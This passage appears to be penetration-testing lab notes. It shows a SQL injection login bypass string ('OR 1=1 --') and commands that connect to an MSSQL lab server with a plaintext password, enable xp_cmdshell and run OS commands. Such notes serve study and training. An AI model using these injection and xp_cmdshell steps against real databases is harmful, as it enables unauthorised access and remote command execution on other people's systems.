
```mysql
offsec' OR 1=1 -- //
```


## Manual Code Execution

MSSQL has function xp_cmdshell on which passing string for execution will be executed on OS. This is by default disable once enabled we can execute commands.
```bash
impacket-mssqlclient Administrator:Lab123@192.168.50.18 -windows-auth
EXECUTE sp_configure 'show advanced options', 1;
RECONFIGURE;
EXECUTE sp_configure 'xp_cmdshell', 1;
RECONFIGURE;```

Like
```bash
EXECUTE xp_cmdshell 'whoami';
```
